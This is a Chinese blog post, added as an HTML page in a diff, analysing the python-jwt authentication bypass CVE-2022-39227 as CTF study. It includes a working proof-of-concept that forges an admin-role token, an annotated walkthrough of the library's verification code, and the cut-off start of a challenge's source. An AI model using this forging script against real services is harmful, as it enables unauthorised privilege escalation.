@@ -1,0 +1,406 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>记CVE-2022-39227-Python-JWT漏洞 - 编程学习者</title>
+	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
+	<meta name="description" content="">
+		<meta property="og:url" content="https://bcxuexizhe.github.io/posts/b43ddca2ed1d216b434cbe9f2499312a/">
+  <meta property="og:site_name" content="编程学习者">
+  <meta property="og:title" content="记CVE-2022-39227-Python-JWT漏洞">
+  <meta property="og:description" content="文章目录 前言影响版本漏洞分析Newstar2023 Week5总结 前言 在Asal1n师傅的随口一说之下，说newstar week5出了一道祥云杯一样的CVE，于是自己也是跑去看了一下，确实是自己不知道的一个CVE漏洞，于是就从这道题学习到了python-jwt库中的身份验证绕过漏洞，顺带做了一下简单的代码分析。
+影响版本 python-jwt &lt; 3.3.4
+漏洞分析 这个漏洞造成的原因更像是库的作者在编写代码的时候疏忽导致的，使得验证的payload内容和返回的payload内容并不是一个payload导致的，下面来简单分析一下。
+先给出github上作者漏洞修补的大致payload，利用payload进行测试，如下：
+python-jwt库地址
+from json import * from python_jwt import * from jwcrypto import jwk payload = {&#39;role&#39;: &#34;guest&#34;} key = jwk.JWK.generate(kty=&#39;oct&#39;, size=256) jwt_json = generate_jwt(payload, key, &#39;HS256&#39;, timedelta(minutes=60)) [header, payload, signature] = jwt_json.split(&#39;.&#39;) parsed_payload = loads(base64url_decode(payload)) parsed_payload[&#39;role&#39;] = &#34;admin&#34; fake = base64url_encode((dumps(parsed_payload,separators=(&#39;,&#39;, &#39;:&#39;))))#这里separators就是消除了空格，不加似乎也并不影响漏洞。 fake_jwt = &#39;{&#34; &#39; &#43; header &#43; &#39;.&#39; &#43; fake &#43; &#39;.&#34;:&#34;&#34;,&#34;protected&#34;:&#34;&#39; &#43; header &#43; &#39;&#34;">
+  <meta property="og:locale" content="zh_CN">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2023-11-07T22:23:33+08:00">
+    <meta property="article:modified_time" content="2023-11-07T22:23:33+08:00">
+
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+	<link rel="dns-prefetch" href="//fonts.googleapis.com">
+	<link rel="dns-prefetch" href="//fonts.gstatic.com">
+	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">
+
+	<link rel="stylesheet" href="/css/style.css">
+	
+
+	<link rel="shortcut icon" href="/favicon.ico">
+		
+  
+
+
+</head>
+<body class="body">
+	<div class="container container--outer">
+		<header class="header">
+	<div class="container header__container">
+		
+	<div class="logo">
+		<a class="logo__link" href="/" title="编程学习者" rel="home">
+			<div class="logo__item logo__text">
+					<div class="logo__title">编程学习者</div>
+					
+				</div>
+		</a>
+	</div>
+		<div class="divider"></div>
+	</div>
+</header>
+		<div class="wrapper flex">
+			<div class="primary">
+			
+<main class="main" role="main">
+	<article class="post">
+		<header class="post__header">
+			<h1 class="post__title">记CVE-2022-39227-Python-JWT漏洞</h1>
+			
+		</header>
+		<div id="gatop"></div>
+		<div class="content post__content clearfix">
+			
+<div id="content_views" class="markdown_views prism-atom-one-dark">
+                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
+                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
+                    </svg>
+                    <p></p> 
+<div class="toc"> 
+ <h4>文章目录</h4> 
+ <ul><li><a href="#_3" rel="nofollow">前言</a></li><li><a href="#_6" rel="nofollow">影响版本</a></li><li><a href="#_9" rel="nofollow">漏洞分析</a></li><li><a href="#Newstar2023_Week5_224" rel="nofollow">Newstar2023 Week5</a></li><li><a href="#_321" rel="nofollow">总结</a></li></ul> 
+</div> 
+<p></p> 
+<hr> 
+<h2><a id="_3"></a>前言</h2> 
+<p>在Asal1n师傅的随口一说之下，说newstar week5出了一道祥云杯一样的CVE，于是自己也是跑去看了一下，确实是自己不知道的一个CVE漏洞，于是就从这道题学习到了python-jwt库中的身份验证绕过漏洞，顺带做了一下简单的代码分析。</p> 
+<h2><a id="_6"></a>影响版本</h2> 
+<p>python-jwt &lt; 3.3.4</p> 
+<h2><a id="_9"></a>漏洞分析</h2> 
+<p>这个漏洞造成的原因更像是库的作者在编写代码的时候疏忽导致的，使得验证的payload内容和返回的payload内容并不是一个payload导致的，下面来简单分析一下。</p> 
+<p>先给出github上作者漏洞修补的大致payload，利用payload进行测试，如下：<br> <a href="https://github.com/davedoesdev/python-jwt/" title="python-jwt库地址">python-jwt库地址</a></p> 
+<pre><code class="prism language-python"><span class="token keyword">from</span> json <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token keyword">from</span> python_jwt <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token keyword">from</span> jwcrypto <span class="token keyword">import</span> jwk
+
+payload <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span><span class="token string">'role'</span><span class="token punctuation">:</span> <span class="token string">"guest"</span><span class="token punctuation">}</span>
+key <span class="token operator">=</span> jwk<span class="token punctuation">.</span>JWK<span class="token punctuation">.</span>generate<span class="token punctuation">(</span>kty<span class="token operator">=</span><span class="token string">'oct'</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">256</span><span class="token punctuation">)</span>
+jwt_json <span class="token operator">=</span> generate_jwt<span class="token punctuation">(</span>payload<span class="token punctuation">,</span> key<span class="token punctuation">,</span> <span class="token string">'HS256'</span><span class="token punctuation">,</span> timedelta<span class="token punctuation">(</span>minutes<span class="token operator">=</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token punctuation">[</span>header<span class="token punctuation">,</span> payload<span class="token punctuation">,</span> signature<span class="token punctuation">]</span> <span class="token operator">=</span> jwt_json<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span>
+parsed_payload <span class="token operator">=</span> loads<span class="token punctuation">(</span>base64url_decode<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span>
+parsed_payload<span class="token punctuation">[</span><span class="token string">'role'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"admin"</span>
+fake <span class="token operator">=</span> base64url_encode<span class="token punctuation">(</span><span class="token punctuation">(</span>dumps<span class="token punctuation">(</span>parsed_payload<span class="token punctuation">,</span>separators<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">,</span> <span class="token string">':'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#这里separators就是消除了空格，不加似乎也并不影响漏洞。</span>
+fake_jwt <span class="token operator">=</span> <span class="token string">'{" '</span> <span class="token operator">+</span> header <span class="token operator">+</span> <span class="token string">'.'</span> <span class="token operator">+</span> fake <span class="token operator">+</span> <span class="token string">'.":"","protected":"'</span> <span class="token operator">+</span> header <span class="token operator">+</span> <span class="token string">'", "payload":"'</span> <span class="token operator">+</span> payload <span class="token operator">+</span> <span class="token string">'","signature":"'</span> <span class="token operator">+</span> signature <span class="token operator">+</span> <span class="token string">'"}'</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>fake_jwt<span class="token punctuation">)</span>
+token <span class="token operator">=</span> verify_jwt<span class="token punctuation">(</span>fake_jwt<span class="token punctuation">,</span> key<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'HS256'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span>
+</code></pre> 
+<ol><li>首先是刚进入前面的代码。</li></ol> 
+<pre><code class="prism language-python"><span class="token comment">#判断是否存在可用的签名算法</span>
+    <span class="token keyword">if</span> allowed_algs <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+        allowed_algs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+<span class="token comment">#如果可用的签名算法不是列表，抛出异常</span>
+    <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>allowed_algs<span class="token punctuation">,</span> <span class="token builtin">list</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token comment"># jwcrypto only supports list of allowed algorithms</span>
+        <span class="token keyword">raise</span> _JWTError<span class="token punctuation">(</span><span class="token string">'allowed_algs must be a list'</span><span class="token punctuation">)</span>
+<span class="token comment">#以.分割jwt的三部分</span>
+    header<span class="token punctuation">,</span> claims<span class="token punctuation">,</span> _ <span class="token operator">=</span> jwt<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span>
+<span class="token comment">#取出头部分进行base64解码和json解析</span>
+    parsed_header <span class="token operator">=</span> json_decode<span class="token punctuation">(</span>base64url_decode<span class="token punctuation">(</span>header<span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token comment">#取出头部算法中的alg参数，此处就是PS256，如果为空或算法不允许，则抛出异常</span>
+    alg <span class="token operator">=</span> parsed_header<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'alg'</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> alg <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+        <span class="token keyword">raise</span> _JWTError<span class="token punctuation">(</span><span class="token string">'alg header not present'</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> alg <span class="token keyword">not</span> <span class="token keyword">in</span> allowed_algs<span class="token punctuation">:</span>
+        <span class="token keyword">raise</span> _JWTError<span class="token punctuation">(</span><span class="token string">'algorithm not allowed: '</span> <span class="token operator">+</span> alg<span class="token punctuation">)</span>
+<span class="token comment">#ignore_not_implemented默认就是False，遍历头部的键，是否在被JWS所支持，不支持抛出异常</span>
+    <span class="token keyword">if</span> <span class="token keyword">not</span> ignore_not_implemented<span class="token punctuation">:</span>
+        <span class="token keyword">for</span> k <span class="token keyword">in</span> parsed_header<span class="token punctuation">:</span>
+            <span class="token keyword">if</span> k <span class="token keyword">not</span> <span class="token keyword">in</span> JWSHeaderRegistry<span class="token punctuation">:</span>
+                <span class="token keyword">raise</span> _JWTError<span class="token punctuation">(</span><span class="token string">'unknown header: '</span> <span class="token operator">+</span> k<span class="token punctuation">)</span>
+            <span class="token keyword">if</span> <span class="token keyword">not</span> JWSHeaderRegistry<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>supported<span class="token punctuation">:</span>
+                <span class="token keyword">raise</span> _JWTError<span class="token punctuation">(</span><span class="token string">'header not implemented: '</span> <span class="token operator">+</span> k<span class="token punctuation">)</span>
+<span class="token comment">#对签名进行验证，对jwt进行解析，这里传入的jwt为原始的jwt字段</span>
+    <span class="token keyword">if</span> pub_key<span class="token punctuation">:</span>
+        token <span class="token operator">=</span> JWS<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        token<span class="token punctuation">.</span>allowed_algs <span class="token operator">=</span> allowed_algs
+        token<span class="token punctuation">.</span>deserialize<span class="token punctuation">(</span>jwt<span class="token punctuation">,</span> pub_key<span class="token punctuation">)</span>
+
+</code></pre> 
+<blockquote> 
+ <p>这里的<code>base64url_decode()</code>是一个用于解码Base64 URL安全编码的函数。<br> Base64 URL安全编码将标准的Base64编码进行了一些修改，以便在URL中传输时不会产生冲突。<br> 具体而言，它使用"-“替换”+“，使用”_“替换”/“，并且将结尾的”="去除，并且会忽略掉不是base64的字符。</p> 
+</blockquote> 
+<ol start="2"><li>进入到<code>deserialize</code>中对签名进行验证，代码如下：</li></ol> 
+<pre><code class="prism language-python">    <span class="token keyword">def</span> <span class="token function">deserialize</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> raw_jws<span class="token punctuation">,</span> key<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> alg<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        self<span class="token punctuation">.</span>objects <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span><span class="token punctuation">}</span>
+        o <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span><span class="token punctuation">}</span>
+        <span class="token keyword">try</span><span class="token punctuation">:</span>
+            <span class="token keyword">try</span><span class="token punctuation">:</span>
+			 <span class="token comment">#对传入的原始的jwt进行json解析</span>
+                djws <span class="token operator">=</span> json_decode<span class="token punctuation">(</span>raw_jws<span class="token punctuation">)</span>
+				<span class="token comment">#判断是否有多个签名，有则取出签名存放到列表当中</span>
+                <span class="token keyword">if</span> <span class="token string">'signatures'</span> <span class="token keyword">in</span> djws<span class="token punctuation">:</span>
+                    o<span class="token punctuation">[</span><span class="token string">'signatures'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+                    <span class="token keyword">for</span> s <span class="token keyword">in</span> djws<span class="token punctuation">[</span><span class="token string">'signatures'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
+                        os <span class="token operator">=</span> self<span class="token punctuation">.</span>_deserialize_signature<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
+                        o<span class="token punctuation">[</span><span class="token string">'signatures'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span>os<span class="token punctuation">)</span>
+                        self<span class="token punctuation">.</span>_deserialize_b64<span class="token punctuation">(</span>o<span class="token punctuation">,</span> os<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'protected'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+				<span class="token comment">#单个签名的情况，直接从原始的jwt中取出签名字段，并且将protected以及header赋值给o对象返回</span>
+                <span class="token keyword">else</span><span class="token punctuation">:</span>
+                    o <span class="token operator">=</span> self<span class="token punctuation">.</span>_deserialize_signature<span class="token punctuation">(</span>djws<span class="token punctuation">)</span>
+                    self<span class="token punctuation">.</span>_deserialize_b64<span class="token punctuation">(</span>o<span class="token punctuation">,</span> o<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'protected'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#是否继续base64解码</span>
+
+                <span class="token keyword">if</span> <span class="token string">'payload'</span> <span class="token keyword">in</span> djws<span class="token punctuation">:</span><span class="token comment">#解析payload字段</span>
+                    <span class="token keyword">if</span> o<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'b64'</span><span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+                        o<span class="token punctuation">[</span><span class="token string">'payload'</span><span class="token punctuation">]</span> <span class="token operator">=</span> base64url_decode<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>djws<span class="token punctuation">[</span><span class="token string">'payload'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+                    <span class="token keyword">else</span><span class="token punctuation">:</span>
+                        o<span class="token punctuation">[</span><span class="token string">'payload'</span><span class="token punctuation">]</span> <span class="token operator">=</span> djws<span class="token punctuation">[</span><span class="token string">'payload'</span><span class="token punctuation">]</span>
+
+            <span class="token keyword">except</span> ValueError<span class="token punctuation">:</span><span class="token comment">#如果json解析异常，则直接以. 分割，提取出三个部分分别赋值</span>
+                c <span class="token operator">=</span> raw_jws<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span>
+                <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">:</span>
+                    <span class="token keyword">raise</span> InvalidJWSObject<span class="token punctuation">(</span><span class="token string">'Unrecognized'</span>
+                                           <span class="token string">' representation'</span><span class="token punctuation">)</span> <span class="token keyword">from</span> <span class="token boolean">None</span>
+                p <span class="token operator">=</span> base64url_decode<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>c<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+                <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">:</span>
+                    o<span class="token punctuation">[</span><span class="token string">'protected'</span><span class="token punctuation">]</span> <span class="token operator">=</span> p<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
+                    self<span class="token punctuation">.</span>_deserialize_b64<span class="token punctuation">(</span>o<span class="token punctuation">,</span> o<span class="token punctuation">[</span><span class="token string">'protected'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+                o<span class="token punctuation">[</span><span class="token string">'payload'</span><span class="token punctuation">]</span> <span class="token operator">=</span> base64url_decode<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>c<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+                o<span class="token punctuation">[</span><span class="token string">'signature'</span><span class="token punctuation">]</span> <span class="token operator">=</span> base64url_decode<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>c<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+            self<span class="token punctuation">.</span>objects <span class="token operator">=</span> o <span class="token comment">#将o赋值给objects对象</span>
+
+        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>  <span class="token comment"># pylint: disable=broad-except</span>
+            <span class="token keyword">raise</span> InvalidJWSObject<span class="token punctuation">(</span><span class="token string">'Invalid format'</span><span class="token punctuation">)</span> <span class="token keyword">from</span> e
+
+        <span class="token keyword">if</span> key<span class="token punctuation">:</span>
+            self<span class="token punctuation">.</span>verify<span class="token punctuation">(</span>key<span class="token punctuation">,</span> alg<span class="token punctuation">)</span><span class="token comment">#将签名算法和key传入verify函数中</span>
+
+</code></pre> 
+<p><img src="https://images2.imgbox.com/76/04/odWnONwF_o.png" alt="file"></p> 
+<p><img src="https://images2.imgbox.com/f4/a3/luB1Snle_o.png" alt="file"></p> 
+<ol start="3"><li><code>verify()</code>函数如下:</li></ol> 
+<pre><code class="prism language-python">    <span class="token keyword">def</span> <span class="token function">verify</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> key<span class="token punctuation">,</span> alg<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> detached_payload<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        self<span class="token punctuation">.</span>verifylog <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+		<span class="token comment">#默认验证是不通过的</span>
+        self<span class="token punctuation">.</span>objects<span class="token punctuation">[</span><span class="token string">'valid'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">False</span>
+        obj <span class="token operator">=</span> self<span class="token punctuation">.</span>objects
+        missingkey <span class="token operator">=</span> <span class="token boolean">False</span>
+        <span class="token keyword">if</span> <span class="token string">'signature'</span> <span class="token keyword">in</span> obj<span class="token punctuation">:</span>
+            payload <span class="token operator">=</span> self<span class="token punctuation">.</span>_get_obj_payload<span class="token punctuation">(</span>obj<span class="token punctuation">,</span> detached_payload<span class="token punctuation">)</span><span class="token comment">#直接提取出payload部分</span>
+            <span class="token comment">#直至这里，传入的解析部分还是原本正常的jwt的字符串，所以_verify也是通过的，将验证生效设置为了true</span>
+			<span class="token keyword">try</span><span class="token punctuation">:</span>
+                self<span class="token punctuation">.</span>_verify<span class="token punctuation">(</span>alg<span class="token punctuation">,</span> key<span class="token punctuation">,</span>
+                             payload<span class="token punctuation">,</span>
+                             obj<span class="token punctuation">[</span><span class="token string">'signature'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+                             obj<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'protected'</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+                             obj<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'header'</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+                obj<span class="token punctuation">[</span><span class="token string">'valid'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">True</span>
+            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>  <span class="token comment"># pylint: disable=broad-except</span>
+                <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> JWKeyNotFound<span class="token punctuation">)</span><span class="token punctuation">:</span>
+                    missingkey <span class="token operator">=</span> <span class="token boolean">True</span>
+                self<span class="token punctuation">.</span>verifylog<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'Failed: [%s]'</span> <span class="token operator">%</span> <span class="token builtin">repr</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span>
+		<span class="token comment">#多个签名的情况</span>
+        <span class="token keyword">elif</span> <span class="token string">'signatures'</span> <span class="token keyword">in</span> obj<span class="token punctuation">:</span>
+            payload <span class="token operator">=</span> self<span class="token punctuation">.</span>_get_obj_payload<span class="token punctuation">(</span>obj<span class="token punctuation">,</span> detached_payload<span class="token punctuation">)</span>
+            <span class="token keyword">for</span> o <span class="token keyword">in</span> obj<span class="token punctuation">[</span><span class="token string">'signatures'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
+                <span class="token keyword">try</span><span class="token punctuation">:</span>
+                    self<span class="token punctuation">.</span>_verify<span class="token punctuation">(</span>alg<span class="token punctuation">,</span> key<span class="token punctuation">,</span>
+                                 payload<span class="token punctuation">,</span>
+                                 o<span class="token punctuation">[</span><span class="token string">'signature'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+                                 o<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'protected'</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+                                 o<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'header'</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+                    <span class="token comment"># Ok if at least one verifies</span>
+                    obj<span class="token punctuation">[</span><span class="token string">'valid'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">True</span>
+                <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>  <span class="token comment"># pylint: disable=broad-except</span>
+                    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> JWKeyNotFound<span class="token punctuation">)</span><span class="token punctuation">:</span>
+                        missingkey <span class="token operator">=</span> <span class="token boolean">True</span>
+                    self<span class="token punctuation">.</span>verifylog<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'Failed: [%s]'</span> <span class="token operator">%</span> <span class="token builtin">repr</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            <span class="token keyword">raise</span> InvalidJWSSignature<span class="token punctuation">(</span><span class="token string">'No signatures available'</span><span class="token punctuation">)</span>
+		<span class="token comment">#如果签名验证不通过，抛出异常</span>
+        <span class="token keyword">if</span> <span class="token keyword">not</span> self<span class="token punctuation">.</span>is_valid<span class="token punctuation">:</span>
+            <span class="token keyword">if</span> missingkey<span class="token punctuation">:</span>
+                <span class="token keyword">raise</span> JWKeyNotFound<span class="token punctuation">(</span><span class="token string">'No working key found in key set'</span><span class="token punctuation">)</span>
+            <span class="token keyword">raise</span> InvalidJWSSignature<span class="token punctuation">(</span><span class="token string">'Verification failed for all '</span>
+                                      <span class="token string">'signatures'</span> <span class="token operator">+</span> <span class="token builtin">repr</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>verifylog<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+</code></pre> 
+<p>这里经过验证码后的token其实是原本正常的jwt，跟伪造的payload还没有关系</p> 
+<p><img src="https://images2.imgbox.com/70/33/FUVAnWm2_o.png" alt="file"></p> 
+<ol start="4"><li>代码继续往下走</li></ol> 
+<pre><code class="prism language-python"><span class="token comment">#json解析.分割出来的中间部分，即我们而已构造的payload</span>
+ 	parsed_claims <span class="token operator">=</span> json_decode<span class="token punctuation">(</span>base64url_decode<span class="token punctuation">(</span>claims<span class="token punctuation">)</span><span class="token punctuation">)</span>
+	<span class="token comment">#获取一些时间参数</span>
+    utcnow <span class="token operator">=</span> datetime<span class="token punctuation">.</span>utcnow<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    now <span class="token operator">=</span> timegm<span class="token punctuation">(</span>utcnow<span class="token punctuation">.</span>utctimetuple<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token comment">#从header头中获取到类型JWT，并进行一些判断，不为JWT抛出异常</span>
+    typ <span class="token operator">=</span> parsed_header<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'typ'</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> typ <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> <span class="token keyword">not</span> checks_optional<span class="token punctuation">:</span>
+            <span class="token keyword">raise</span> _JWTError<span class="token punctuation">(</span><span class="token string">'typ header not present'</span><span class="token punctuation">)</span>
+    <span class="token keyword">elif</span> typ <span class="token operator">!=</span> <span class="token string">'JWT'</span><span class="token punctuation">:</span>
+        <span class="token keyword">raise</span> _JWTError<span class="token punctuation">(</span><span class="token string">'typ header is not JWT'</span><span class="token punctuation">)</span>
+<span class="token comment">#从fakepayload中获取到iat的值即时间戳，判断令牌的签发时间是否有效</span>
+    iat <span class="token operator">=</span> parsed_claims<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'iat'</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> iat <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> <span class="token keyword">not</span> checks_optional<span class="token punctuation">:</span>
+            <span class="token keyword">raise</span> _JWTError<span class="token punctuation">(</span><span class="token string">'iat claim not present'</span><span class="token punctuation">)</span>
+    <span class="token keyword">elif</span> iat <span class="token operator">&gt;</span> timegm<span class="token punctuation">(</span><span class="token punctuation">(</span>utcnow <span class="token operator">+</span> iat_skew<span class="token punctuation">)</span><span class="token punctuation">.</span>utctimetuple<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">raise</span> _JWTError<span class="token punctuation">(</span><span class="token string">'issued in the future'</span><span class="token punctuation">)</span>
+<span class="token comment">#获取jwt令牌的生效时间，此时是否有效</span>
+    nbf <span class="token operator">=</span> parsed_claims<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'nbf'</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> nbf <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> <span class="token keyword">not</span> checks_optional<span class="token punctuation">:</span>
+            <span class="token keyword">raise</span> _JWTError<span class="token punctuation">(</span><span class="token string">'nbf claim not present'</span><span class="token punctuation">)</span>
+    <span class="token keyword">elif</span> nbf <span class="token operator">&gt;</span> now<span class="token punctuation">:</span>
+        <span class="token keyword">raise</span> _JWTError<span class="token punctuation">(</span><span class="token string">'not yet valid'</span><span class="token punctuation">)</span>
+<span class="token comment"># 获取到令牌的过期即有效截止时间，判断令牌是否有效，如果小于现在时间，则过期</span>
+    exp <span class="token operator">=</span> parsed_claims<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'exp'</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> exp <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> <span class="token keyword">not</span> checks_optional<span class="token punctuation">:</span>
+            <span class="token keyword">raise</span> _JWTError<span class="token punctuation">(</span><span class="token string">'exp claim not present'</span><span class="token punctuation">)</span>
+    <span class="token keyword">elif</span> exp <span class="token operator">&lt;=</span> now<span class="token punctuation">:</span>
+        <span class="token keyword">raise</span> _JWTError<span class="token punctuation">(</span><span class="token string">'expired'</span><span class="token punctuation">)</span>
+<span class="token comment"># 返回.分割后的头部和中间部分即我们的fakepayload</span>
+    <span class="token keyword">return</span> parsed_header<span class="token punctuation">,</span> parsed_claims
+
+</code></pre> 
+<blockquote> 
+ <p>可以看出，在验证令牌的时候使用的是正常的JWT，而返回的却是以<code>.</code>分割的传入jwt的中间部分和头部，使得解析返回的payload和验证签名的pauload并不是一个payload，导致了身份绕过。</p> 
+</blockquote> 
+<h2><a id="Newstar2023_Week5_224"></a>Newstar2023 Week5</h2> 
+<p>题目给了源码如下：</p> 
+<pre><code class="prism language-python"><span class="token comment"># -*- coding: utf-8 -*-</span>
+<span class="token keyword">import</span> base64
+<span class="token keyword">import</span> string
+<span class="token keyword">import</span> random
+<span class="token keyword">from</span> flask <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token keyword">import</span> jwcrypto<span class="token punctuation">.</span>jwk <span class="token keyword">as</span> jwk
+<span class="token keyword">import</span> pickle
